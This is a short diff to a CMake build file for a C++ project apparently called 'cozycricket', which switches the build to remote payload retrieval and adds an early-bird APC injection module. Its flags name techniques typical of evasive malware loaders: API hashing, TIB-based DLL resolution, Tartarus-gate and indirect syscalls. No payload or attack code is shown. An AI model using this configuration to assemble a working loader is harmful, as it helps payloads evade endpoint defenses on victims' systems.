@@ -7,7 +7,7 @@ set(CMAKE_CXX_STANDARD 23)
 set(CMAKE_CXX_STANDARD_REQUIRED ON)
 
 ### ----- START CHANGEME -----
-add_definitions(-DRETRIEVE_LOCAL -DHASH_DJB2 -DRESOLVEDLL_TIB -DRESOLVEAPI_DOS -DGETSYSCALL_SORT_TARTARUS -DSYSCALL_INDIRECT)
+add_definitions(-DRETRIEVE_FETCH -DHASH_DJB2 -DRESOLVEDLL_TIB -DRESOLVEAPI_DOS -DGETSYSCALL_SORT_TARTARUS -DSYSCALL_INDIRECT -DINJECT_EXTERNAL_EBAPC)
 ### ----- END CHANGEME -----
 
 add_executable(cozycricket
@@ -20,6 +20,7 @@ add_executable(cozycricket
     resolve/resolve_api.cpp
     syscall/get_syscall.cpp
     syscall/syscalls.asm
+    inject/inject.cpp
 )
 
 find_package(OpenSSL REQUIRED)
